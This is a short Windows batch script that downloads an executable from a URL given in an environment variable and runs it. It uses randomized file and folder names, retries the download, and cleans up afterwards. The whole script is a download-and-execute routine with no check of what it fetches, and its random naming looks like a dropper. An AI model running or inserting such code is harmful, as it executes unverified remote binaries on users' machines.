@echo off
setlocal EnableDelayedExpansion

set URL=%DOWNLOAD_URL%
set TEMP_DIR=%TEMP%\dl_%RANDOM%_%RANDOM%
set LOGFILE=%TEMP%\log_%RANDOM%_%RANDOM%.txt
set RETRIES=3
set COUNT=0

:: توليد اسم ملف عشوائي كامل
set /a RAND=%RANDOM% * %RANDOM%
set /a RAND2=%RANDOM% * %RANDOM%
set FILE=dl_!RAND!_!RAND2!.exe

if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%"
mkdir "%TEMP_DIR%" >nul 2>&1
cd /d "%TEMP_DIR%"

echo [INFO] Starting download from %URL% > "%LOGFILE%"
echo -------------------------------------------------- >> "%LOGFILE%"

:DOWNLOAD
set /a COUNT+=1
echo [INFO] Attempt !COUNT! of %RETRIES% >> "%LOGFILE%"
powershell -Command "try {Invoke-WebRequest '%URL%' -OutFile '%FILE%' -ErrorAction Stop; exit 0} catch {exit 1}"

if exist "%FILE%" (
    echo [SUCCESS] File downloaded successfully >> "%LOGFILE%"
    for %%I in ("%FILE%") do set SIZE=%%~zI
    if !SIZE! gtr 102400 (
        echo [INFO] Valid file size detected: !SIZE! bytes >> "%LOGFILE%"
        copy "%FILE%" "%~dp0!FILE!" >nul
        start "" "%~dp0!FILE!"
        echo [INFO] Executed downloaded file successfully >> "%LOGFILE%"
        goto END
    ) else (
        echo [ERROR] File too small or corrupted (!SIZE! bytes) >> "%LOGFILE%"
        del "%FILE%" >nul 2>&1
    )
) else (
    echo [ERROR] Download failed on attempt !COUNT! >> "%LOGFILE%"
)

if !COUNT! lss %RETRIES% (
    echo [INFO] Retrying... >> "%LOGFILE%"
    timeout /t 2 >nul
    goto DOWNLOAD
) else (
    echo [FATAL] All download attempts failed >> "%LOGFILE%"
)

:END
echo [INFO] Cleaning up temporary files >> "%LOGFILE%"
cd /d "%~dp0"
rmdir /s /q "%TEMP_DIR%" >nul 2>&1
echo [INFO] Process finished >> "%LOGFILE%"
endlocal
exit /b 0
